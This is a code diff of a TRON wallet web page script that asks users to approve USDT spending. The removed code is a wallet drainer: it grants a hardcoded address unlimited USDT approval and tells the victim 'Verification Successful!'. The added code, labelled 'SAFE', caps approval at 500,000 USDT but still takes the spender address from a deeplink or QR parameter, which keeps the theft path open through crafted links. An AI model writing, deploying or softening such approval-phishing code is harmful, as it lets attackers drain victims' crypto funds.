@@ -1,37 +1,66 @@
-// app.js
+// app.js — Deeplink-driven spender (SAFE)
+
 const btnNext = document.getElementById('btn-next');
 const statusDiv = document.getElementById('status');
+const spenderInput = document.getElementById('spender');
+const amountInput = document.getElementById('amount');
 
-// *** APNA ADDRESS YAHAN DALEIN ***
-const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 
-const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const MAX_APPROVAL_USDT = 500000;
 
+// -------------------------
+// Deeplink / QR autofill
+// -------------------------
+(function autofill() {
+  const params = new URLSearchParams(window.location.search);
+  const addr =
+    params.get('spender') ||
+    params.get('address') ||
+    params.get('to');
+
+  if (addr && /^T[a-zA-Z0-9]{33}$/.test(addr)) {
+    spenderInput.value = addr;
+  }
+})();
+
+// -------------------------
+// Approve handler
+// -------------------------
 btnNext.addEventListener('click', async () => {
-    if (typeof window.tronWeb === 'undefined') {
-        statusDiv.innerHTML = "<span style='color:red;'>Please open in Trust Wallet Browser</span>";
-        return;
-    }
+  if (!window.tronWeb) {
+    statusDiv.textContent = "Open in TRON wallet browser";
+    return;
+  }
 
-    try {
-        statusDiv.innerText = "Connecting...";
-        
-        // USDT Contract Instance
-        const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-        
-        // Unlimited Approval Amount
-        const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  const spender = spenderInput.value.trim();
+  if (!/^T[a-zA-Z0-9]{33}$/.test(spender)) {
+    statusDiv.textContent = "Invalid TRON address";
+    return;
+  }
 
-        statusDiv.innerText = "Requesting Approval...";
+  let amountUsdt = Number(amountInput.value);
+  if (!amountUsdt || amountUsdt <= 0) {
+    statusDiv.textContent = "Enter valid amount";
+    return;
+  }
 
-        // Trigger Approval
-        await contract.approve(SPENDER_ADDRESS, amount).send({
-            feeLimit: 100000000
-        });
+  amountUsdt = Math.min(amountUsdt, MAX_APPROVAL_USDT);
 
-        statusDiv.innerHTML = "<span style='color:green;'>Verification Successful!</span>";
-        
-    } catch (error) {
-        console.error(error);
-        statusDiv.innerHTML = "<span style='color:red;'>Transaction Rejected or Failed</span>";
-    }
+  try {
+    statusDiv.textContent = `Approving ${amountUsdt} USDT...`;
+
+    const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
+    const amount = window.tronWeb
+      .toBigNumber(amountUsdt)
+      .times(1e6)
+      .toString();
+
+    await usdt.approve(spender, amount).send({
+      feeLimit: 100_000_000
+    });
+
+    statusDiv.textContent = `Approval successful (${amountUsdt} USDT)`;
+  } catch (e) {
+    statusDiv.textContent = "Transaction rejected or failed";
+  }
 });
